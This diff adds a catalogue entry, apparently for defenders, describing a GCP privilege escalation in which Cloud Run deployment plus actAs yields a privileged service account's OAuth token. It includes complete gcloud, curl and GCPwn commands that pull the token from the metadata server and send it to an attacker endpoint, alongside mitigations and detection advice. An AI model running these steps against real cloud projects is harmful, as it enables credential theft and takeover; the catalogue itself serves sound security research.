@@ -1,0 +1,266 @@
+id: gcp-cloudrun-001
+name: iam.serviceAccounts.actAs + run.services.create
+category: new-passrole
+services:
+- iam
+- run
+permissions:
+  required:
+  - permission: iam.serviceAccounts.actAs
+    resourceConstraints: Must be granted on the privileged target service account that will be attached to the new Cloud Run service
+  - permission: run.services.create
+    resourceConstraints: Must be granted at the project level for the location where the attacker creates the service
+  - permission: run.services.get
+    resourceConstraints: Required to retrieve the newly created service and its URL; also used by `gcloud run deploy` for readiness tracking
+  - permission: run.operations.get
+    resourceConstraints: Required to poll the asynchronous service-creation operation until deployment completes
+  additional:
+  - permission: logging.logEntries.list
+    resourceConstraints: Needed only to read the token back through Cloud Logging when the payload prints it to the service's logs; an out-of-band exfiltration endpoint does not require this permission
+  - permission: run.routes.invoke
+    resourceConstraints: Helpful for invoking a private service to trigger a fresh execution of the payload; the initial deployment and readiness instance can execute the payload without it
+  - permission: run.services.update
+    resourceConstraints: Required only by `gcloud run deploy` when reusing an existing service name and taking the update path; not needed via the REST API for a fresh service
+  - permission: iam.serviceAccounts.list
+    resourceConstraints: Helpful for enumerating service accounts in the project to identify privileged targets
+  - permission: iam.serviceAccounts.getIamPolicy
+    resourceConstraints: Useful for inspecting service account IAM policies to identify targets on which the attacker holds `iam.serviceAccounts.actAs`
+  - permission: run.services.list
+    resourceConstraints: Helpful for enumerating existing Cloud Run services and understanding normal deployment patterns
+description: A principal with `iam.serviceAccounts.actAs` on a privileged service account and `run.services.create` can deploy a new Cloud Run service that executes attacker-controlled container code as that service account. The container can retrieve its attached identity's OAuth access token from the metadata server and send it to an attacker-controlled endpoint, granting the attacker every permission held by the target service account without requiring Artifact Registry access or making the service public.
+prerequisites:
+  admin:
+  - A target service account must exist on which the attacker holds `iam.serviceAccounts.actAs`
+  - The target service account must hold `roles/owner`, `roles/editor`, or an equivalent administrative custom role
+  - The project must permit Cloud Run to pull the selected public container image
+  lateral:
+  - A target service account must exist on which the attacker holds `iam.serviceAccounts.actAs`
+  - The target service account must hold permissions that provide useful access beyond the attacker's starting principal
+exploitationSteps:
+  gcloud:
+  - step: 1
+    command: |
+      cat > /tmp/cloudrun-exfil.json <<'JSON'
+      {
+        "EXFIL_PAYLOAD": "import os,urllib.request,http.server; B='http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/'; H={'Metadata-Flavor':'Google'}; token=urllib.request.urlopen(urllib.request.Request(B+'token',headers=H)).read().decode(); print('EXFIL_TOKEN: '+token,flush=True); http.server.HTTPServer(('',int(os.environ.get('PORT','8080'))),http.server.SimpleHTTPRequestHandler).serve_forever()"
+      }
+      JSON
+    description: Prepare a container payload that retrieves the attached service account's OAuth token from the metadata server, prints it to stdout, and remains healthy for Cloud Run
+  - step: 2
+    command: |
+      gcloud run deploy SERVICE_NAME \
+        --image=docker.io/library/python:3.13-slim \
+        --region=REGION \
+        --project=PROJECT_ID \
+        --service-account=TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \
+        --command=python \
+        --args=-c \
+        --args="import os;exec(os.environ['EXFIL_PAYLOAD'])" \
+        --env-vars-file=/tmp/cloudrun-exfil.json \
+        --memory=512Mi \
+        --max-instances=1 \
+        --no-allow-unauthenticated \
+        --format=json
+    description: Create a private Cloud Run service from a public image and attach the privileged target service account. A fresh deployment uses the required permission set; reusing an existing service name also needs the additional `run.services.update` permission.
+  - step: 3
+    command: |
+      gcloud logging read \
+        'resource.type=cloud_run_revision AND resource.labels.service_name=SERVICE_NAME AND resource.labels.location=REGION' \
+        --project=PROJECT_ID \
+        --limit=20 \
+        --format='value(textPayload)'
+    description: Read the target service account's token from the container logs. This exfiltration channel requires the additional `logging.logEntries.list` permission; a payload that sends the token to an attacker-controlled endpoint does not.
+  - step: 4
+    command: |
+      EXFILTRATED_TOKEN="TOKEN_FROM_EXFIL_TOKEN_LOG_ENTRY"
+      curl -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
+        "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
+    description: Use the exfiltrated OAuth bearer token directly against Google APIs to operate as the target service account
+  curl:
+  - step: 1
+    command: |
+      ACCESS_TOKEN=$(gcloud auth print-access-token)
+      EXFIL_PAYLOAD='import json,os,urllib.request,http.server
+      B="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/"
+      H={"Metadata-Flavor":"Google"}
+      token=urllib.request.urlopen(urllib.request.Request(B+"token",headers=H)).read()
+      req=urllib.request.Request("https://ATTACKER_ENDPOINT.example/collect",data=token,headers={"Content-Type":"application/json"},method="POST")
+      urllib.request.urlopen(req,timeout=10).read()
+      http.server.HTTPServer(("",int(os.environ.get("PORT","8080"))),http.server.SimpleHTTPRequestHandler).serve_forever()'
+      CREATE_BODY=$(jq -n \
+        --arg serviceAccount 'TARGET_SA@PROJECT_ID.iam.gserviceaccount.com' \
+        --arg payload "$EXFIL_PAYLOAD" \
+        '{template: {serviceAccount: $serviceAccount, containers: [{image: "docker.io/library/python:3.13-slim", command: ["python"], args: ["-c", $payload], resources: {limits: {memory: "512Mi", cpu: "1000m"}}}]}}')
+    description: Build a raw Cloud Run service definition whose container sends the metadata-server token to an attacker-controlled endpoint. This out-of-band channel does not require `logging.logEntries.list` or `run.routes.invoke`.
+  - step: 2
+    command: |
+      CREATE_RESPONSE=$(curl -sS -X POST \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
+        -H "Content-Type: application/json" \
+        -d "$CREATE_BODY" \
+        "https://run.googleapis.com/v2/projects/PROJECT_ID/locations/REGION/services?serviceId=SERVICE_NAME")
+      OPERATION_NAME=$(echo "$CREATE_RESPONSE" | jq -r '.name')
+    description: Create the service with `run.services.create` while using `iam.serviceAccounts.actAs` to attach the privileged target service account
+  - step: 3
+    command: |
+      while true; do
+        OPERATION=$(curl -sS \
+          -H "Authorization: Bearer $ACCESS_TOKEN" \
+          "https://run.googleapis.com/v2/$OPERATION_NAME")
+        [ "$(echo "$OPERATION" | jq -r '.done // false')" = "true" ] && break
+        sleep 5
+      done
+    description: Poll the asynchronous deployment with `run.operations.get` until the service is ready and the container has started
+  - step: 4
+    command: |
+      SERVICE=$(curl -sS \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
+        "https://run.googleapis.com/v2/projects/PROJECT_ID/locations/REGION/services/SERVICE_NAME")
+      echo "$SERVICE" | jq -r '.urls[0] // .uri'
+    description: Retrieve the deployed service with `run.services.get` to confirm creation; the payload sends the target service account's token out of band during container startup
+  - step: 5
+    command: |
+      EXFILTRATED_TOKEN="TOKEN_RECEIVED_AT_ATTACKER_ENDPOINT"
+      curl -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
+        "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
+    description: Use the exfiltrated bearer token directly against Google APIs to operate as the target service account
+  gcpwn:
+  - step: 1
+    command: |
+      modules run exploit_cloudrun_service_as_sa \
+        --target-sa TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \
+        --region REGION \
+        --service-name SERVICE_NAME \
+        --exfil-mode url \
+        --exfil-url https://ATTACKER_ENDPOINT.example/collect
+    description: Use GCPwn's Cloud Run service exploitation module to create a service as the target service account and send its metadata-server token to an attacker-controlled callback. URL exfiltration avoids requiring `logging.logEntries.list`; omit `--invoke` to avoid adding `run.routes.invoke` to the minimum create path.
+  - step: 2
+    command: |
+      EXFILTRATED_TOKEN="TOKEN_RECEIVED_AT_ATTACKER_ENDPOINT"
+      curl -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
+        "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
+    description: Use the token recovered by GCPwn directly against Google APIs as the attached service account
+recommendation: |
+  High powered service accounts + overly broad `iam.serviceAccounts.actAs` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid privileged service accounts on Cloud Run services** - Very rarely does a Cloud Run service need `roles/editor` or `roles/owner`. Give each service a dedicated service account with only the roles it needs.
+  - **Grant `iam.serviceAccounts.actAs` on specific service accounts, not the project** - Bind `roles/iam.serviceAccountUser` or a custom role on the individual service account a deployer needs, never at the project or folder level.
+  - **Separate Cloud Run creation from privileged identities** - Do not grant a principal both `run.services.create` and `iam.serviceAccounts.actAs` over service accounts with permissions that principal should not inherit.
+  Use IAM Conditions to narrow the `actAs` grant further:
+
+  ```json
+  {
+    "role": "roles/iam.serviceAccountUser",
+    "members": ["serviceAccount:deployer@PROJECT_ID.iam.gserviceaccount.com"],
+    "condition": {
+      "title": "deploy-window-only",
+      "expression": "request.time < timestamp(\"2026-12-31T00:00:00Z\")"
+    }
+  }
+  ```
+
+  - Monitor Cloud Audit Logs for `google.cloud.run.v2.Services.CreateService` events that set a service account the caller has not previously deployed with.
+  - Alert on Cloud Run services created from unexpected public images, with command or argument overrides, or by principals that do not normally deploy services.
+  - Monitor for `google.iam.admin.v1.SetIAMPolicy` events on service accounts that grant `iam.serviceAccounts.actAs`, particularly at project scope.
+  - Correlate service creation, operation polling, service retrieval, and unusual outbound connections or log reads by the deploying principal.
+  - Inspect Cloud Run logs for metadata-server access patterns or OAuth tokens written to stdout, and alert when a principal with no logging duties reads a new service's logs immediately after deployment.
+  - Regularly audit which service accounts Cloud Run services use and down-scope any with `roles/editor` or `roles/owner`.
+  - Use IAM Recommender and Policy Analyzer to find unused or overly broad `actAs` grants.
+limitations: |
+  This path provides administrative access only when the attached service account has administrative project permissions such as `roles/owner`, `roles/editor`, or an equivalent custom role. A narrowly scoped target yields only those permissions, although they may enable further escalation.
+
+  The malicious container must be able to start and communicate with an exfiltration channel. Organization policies, VPC Service Controls, egress restrictions, Binary Authorization, or restrictions on external container images can prevent the demonstrated payload. Reading a token printed to Cloud Logging requires the additional `logging.logEntries.list` permission, while invoking a private service to trigger another execution requires the additional `run.routes.invoke` permission. Neither is fundamental when the container can send the token directly to an attacker-controlled endpoint during startup. OAuth access tokens are short-lived, but the attacker can obtain new tokens while the service remains deployable or running.
+discoveryAttribution:
+  firstDocumented:
+    author: Spencer Gietzen
+    organization: Rhino Security Labs
+    date: 2020
+    link: https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
+references:
+- title: Privilege Escalation in Google Cloud Platform - Part 1 (IAM) - Rhino Security Labs
+  url: https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
+- title: RhinoSecurityLabs/GCP-IAM-Privilege-Escalation - run.services.create exploit script
+  url: https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/2c1031ff4bb019abe5f12bf8e85ed1a3be79b710/ExploitScripts/run.services.create.py
+- title: GCPwn Cloud Run service account exploitation module - Scott Weston / NetSPI
+  url: https://github.com/NetSPI/gcpwn/blob/acabc59d87fdc5dca86d919aa72faf7a628e2e9a/gcpwn/modules/gcp/cloudrun/exploit/exploit_cloudrun_service_as_sa.py
+- title: GCPwn CREATE_CLOUDRUN_SERVICE_AS_SA OpenGraph edge - Scott Weston / NetSPI
+  url: https://github.com/NetSPI/gcpwn/blob/acabc59d87fdc5dca86d919aa72faf7a628e2e9a/gcpwn/mappings/og_defined_edges.json#L446-L466
+- title: Configure Cloud Run service identity - Google Cloud
+  url: https://cloud.google.com/run/docs/configuring/services/service-identity
+relatedPaths:
+- gcp-cloudfunctions-001
+- gcp-cloudfunctions-002
+- apprunner-001
+detectionTools:
+  gcpwn: https://github.com/NetSPI/GCPwn/blob/acabc59d87fdc5dca86d919aa72faf7a628e2e9a/gcpwn/mappings/og_defined_edges.json#L445-L466
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: modules/scenarios/gcp/single-account/privesc-one-hop/to-admin/gcp-cloudrun-001-iam-serviceaccountsactas+run-servicescreate
+    description: "Deploy Terraform into your own GCP project to practice creating a new Cloud Run service with `run.services.create`, attaching a privileged target service account via `iam.serviceAccounts.actAs`, and exfiltrating its OAuth token from the metadata server to inherit its project permissions."
+attackVisualization:
+  nodes:
+  - id: start
+    label: Starting Principal
+    type: principal
+    description: The attacker holds `iam.serviceAccounts.actAs` on a target service account and the project-level Cloud Run permissions required to create and track a new service.
+  - id: cloud_run_service
+    label: New Cloud Run Service
+    type: resource
+    description: A new private Cloud Run service deployed from a public container image with attacker-controlled code and the target service account attached as its runtime identity.
+  - id: target_sa
+    label: Attached Service Account
+    type: principal
+    description: The existing service account attached to the new service through `iam.serviceAccounts.actAs`. The container receives this identity at runtime and can request its short-lived OAuth token from the metadata server.
+  - id: exfiltrate_token
+    label: Exfiltrate OAuth Access Token
+    type: payload
+    color: '#99ccff'
+    description: Attacker-controlled container code retrieves the attached service account's OAuth token and sends it to an attacker-controlled endpoint. It can alternatively print the token to Cloud Logging when the attacker holds `logging.logEntries.list`.
+  - id: admin
+    label: Effective Administrator
+    type: outcome
+    color: '#99ff99'
+    description: The attached service account holds `roles/owner`, `roles/editor`, or an equivalent administrative custom role, giving the attacker effective administrative access for the token's lifetime.
+  - id: limited_access
+    label: Limited Additional Access
+    type: outcome
+    color: '#ffeb99'
+    description: The attached service account has useful but non-administrative permissions. The token grants only that narrower access, which may enable further escalation.
+  - id: no_access
+    label: No Additional Access
+    type: outcome
+    color: '#cccccc'
+    description: The attached service account has no meaningful permissions beyond those already available to the starting principal, so the token provides no material increase in access.
+  edges:
+  - from: start
+    to: cloud_run_service
+    label: iam.serviceAccounts.actAs + run.services.create
+    description: The attacker creates a Cloud Run service and attaches the target service account. `run.operations.get` and `run.services.get` support deployment tracking and retrieval of the created service.
+  - from: cloud_run_service
+    to: target_sa
+    label: Service runs as attached account
+    description: Cloud Run starts the deployed container with the target service account as its runtime identity and exposes short-lived credentials for that identity through the metadata server.
+  - from: target_sa
+    to: exfiltrate_token
+    label: Retrieve and exfiltrate OAuth token
+    description: The malicious container queries the metadata server and exports the target service account's token. An out-of-band callback needs no additional IAM permission; reading it from logs requires `logging.logEntries.list`.
+  - from: exfiltrate_token
+    to: admin
+    label: If attached account has administrative permissions
+    branch: A
+    condition: admin
+    description: If the attached service account has administrative permissions, the attacker can use the token for privileged Google API operations.
+  - from: exfiltrate_token
+    to: limited_access
+    label: If attached account has narrower permissions
+    branch: B
+    condition: some_permissions
+    description: If the attached service account has scoped permissions, the bearer token provides those permissions and may enable another escalation path.
+  - from: exfiltrate_token
+    to: no_access
+    label: If attached account has minimal permissions
+    branch: C
+    condition: no_permissions
+    description: If the attached service account has no meaningful additional permissions, exfiltrating its token does not produce useful additional access.
